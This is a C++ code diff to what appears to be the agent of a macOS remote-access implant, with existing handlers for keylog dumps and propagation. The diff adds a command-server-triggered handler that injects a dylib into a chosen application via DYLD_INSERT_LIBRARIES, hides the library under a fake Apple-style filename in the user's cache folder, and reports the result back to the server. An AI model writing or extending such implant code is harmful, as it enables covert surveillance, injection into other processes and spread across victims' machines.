@@ -1,6 +1,7 @@
 #include "../include/Agent.hpp"
 #include "../include/entry_dylib.hpp"
 #include "../include/EntitlementScanner.hpp"
+#include "../include/MachInjector.hpp"
 #include <iostream>
 #include <cstdio>
 #include <cstdlib>
@@ -242,6 +243,8 @@ void Agent::handleDispatching(Packet&& packet) {
         handleKeylogDump();
     } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE)) {
         handlePropagation(std::move(packet));
+    } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
+        handleInjection(std::move(packet));
     }
 }
 
@@ -325,6 +328,38 @@ void Agent::handlePropagation(Packet&& packet) {
 
     Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
                std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+}
+
+void Agent::handleInjection(Packet&& packet) {
+    const auto& raw = packet.getPayload();
+    if (raw.empty()) {
+        Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
+        m_socket.sendData(res.serialize());
+        return;
+    }
+
+    std::string target_path(raw.begin(), raw.end());
+    std::cout << "[Agent] Injection requested into: " << target_path << std::endl;
+
+    // Build TargetApp on the fly — capability defaults to DYLD_INSERT_LIBRARIES
+    inferno::tier2::TargetApp target;
+    target.executable_path = target_path;
+    target.path = target_path;
+    target.capability = inferno::tier2::InjectionCapability::DYLD_INSERT_LIBRARIES;
+
+    const char* home = ::getenv("HOME");
+    std::string dylib_path = home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
+                                  : "/tmp/.inferno_agent.dylib";
+
+    bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
+                                                     m_server_ip, m_server_port);
+
+    std::string result = target_path + "||"
+                       + std::to_string(static_cast<int>(target.capability)) + "|"
+                       + (success ? "1" : "0");
+
+    Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
     m_socket.sendData(res.serialize());
 }
 
